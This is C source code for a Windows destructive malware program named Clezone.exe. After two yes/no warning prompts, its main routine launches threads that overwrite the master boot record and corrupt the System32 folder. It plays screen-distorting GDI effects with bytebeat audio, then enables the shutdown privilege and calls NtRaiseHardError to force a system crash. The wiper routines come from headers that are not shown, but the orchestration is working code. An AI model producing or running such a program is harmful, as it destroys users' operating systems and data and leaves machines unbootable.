#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "OtherPayloads.h"
#include "GDI.h"
#include "Audio.h"
#include "BytebeatsDefinitions.h"
#include "MBROverwriter.h"
#include "FileCorruptor.h"
#include "resource1.h"


LPCSTR death = "DEATH IS HERE!!!";

DWORD WINAPI Msg(LPVOID lpThread)
{
	MSGBOXPARAMSA m;
	ZeroMemory(&m, sizeof(m));
	m.cbSize = sizeof(m);
	m.hwndOwner = NULL;
	m.hInstance = GetModuleHandleA(NULL);
	m.lpszText = death;
	m.lpszCaption = death;
	m.dwStyle = MB_OK | MB_RTLREADING | MB_RIGHT | MB_USERICON;
	m.lpszIcon = MAKEINTRESOURCEA(IDI_WINLOGO);

	MessageBoxIndirectA(&m);
}


bool t1;
unsigned int t2;



int SleepTime = 30000;


int speed = 30;

int main() {
	HWND scw = GetConsoleWindow();
	ShowWindow(scw, SW_HIDE);
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	typedef NTSTATUS(NTAPI* PFN_RtlAdjustPrivilege)(int, bool, bool, PBOOL);
	typedef NTSTATUS(NTAPI* PFN_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);

	PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	PFN_NtRaiseHardError pNtRaiseHardError = (PFN_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
	
	if (MessageBoxA(NULL, "WARNING! \n \nYou ran a malware, also known as Clezone.exe that can damage your PC. \nIf you continue, your entire PC will be destroyed and there is no way back. \nContinue?", "Clezone.exe", MB_YESNO | MB_ICONWARNING) == IDYES) {
		if (MessageBoxA(NULL, " Clicking yes will now result in a destruction. \n \n STILL CONTINUE? \n This is the last chance to stop this program from infecting your PC.", "Still going for it?", MB_YESNO | MB_ICONWARNING) == IDYES) {
			CreateThread(0, 0, OverwriteMBR, 0, 0, 0);
			CreateThread(0, 0, CorruptSystem32, 0, 0, 0);
			Sleep(2000);
			CreateThread(0, 0, Msg, 0, 0, 0);
			Sleep(3000);
			int RandomNumber = rand() % 15000;
			int xSleep = SleepTime - RandomNumber;
			int ySleep = RandomNumber + xSleep;
			PlayBytebeat(Bytebeat_One, 8000);
			HANDLE gdi1 = CreateThread(0, 0, GDI_One, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi1, 0);
			InvalidateRect(0, 0, 0);
			StopBytebeat();
			Sleep(300);
			PlayBytebeat(Bytebeat_Two, 8000);
			HANDLE gdi2 = CreateThread(0, 0, GDI_Two, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi2, 0);
			StopBytebeat();
			InvalidateRect(0, 0, 0);
			Sleep(300);
			HANDLE gdi3 = CreateThread(0, 0, GDI_Three, 0, 0, 0);
			PlayBytebeat(Bytebeat_Three, 16000);
			Sleep(30000);
			TerminateThread(gdi3, 0);
			StopBytebeat();
			InvalidateRect(0, 0, 0);
			Sleep(300);
			HANDLE gdi4 = CreateThread(0, 0, GDI_Four, 0, 0, 0);
			HANDLE icons = CreateThread(0, 0, ErrorRings, 0, 0, 0);
			PlayBytebeat(Bytebeat_Four, 8000);
			Sleep(30000);
			TerminateThread(gdi4, 0);
			InvalidateRect(0, 0, 0);
			StopBytebeat();
			Sleep(300);
			HANDLE gdi5 = CreateThread(0, 0, GDI_Five, 0, 0, 0);
			PlayBytebeat(Bytebeat_Five, 16000);
			HANDLE train = CreateThread(0, 0, ShiftXW, 0, 0, 0);
			Sleep(30000);
			TerminateThread(train, 0);
			TerminateThread(gdi5, 0);
			InvalidateRect(0, 0, 0);
			StopBytebeat();
			Sleep(300);
			PlayBytebeat(Bytebeat_Six, 8000);
			HANDLE gdi6 = CreateThread(0, 0, warp, 0, 0, 0);
			HANDLE ball = CreateThread(0, 0, BallThread, 0, 0, 0);
			HANDLE HSL = CreateThread(0, 0, tHSL, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi6, 0);
			TerminateThread(ball, 0);
			TerminateThread(HSL, 0);
			StopBytebeat();
			InvalidateRect(0, 0, 0);
			Sleep(300);
			PlayBytebeat(Bytebeat_Seven, 8000);
			HANDLE gdi7 = CreateThread(0, 0, GDI_Seven, 0, 0, 0);
			Sleep(30000);
			TerminateThread(gdi7, 0);
			StopBytebeat();
			InvalidateRect(0, 0, 0);

			if (pRtlAdjustPrivilege) pRtlAdjustPrivilege(19, true, false, (PBOOL)&t1);
			if (pNtRaiseHardError) pNtRaiseHardError(0xC000014F, 0, 0, NULL, 6, (PULONG)&t2);
		}
		else {
			ExitProcess(0);
		}
	}
	else {
		ExitProcess(0);
	}
	
}
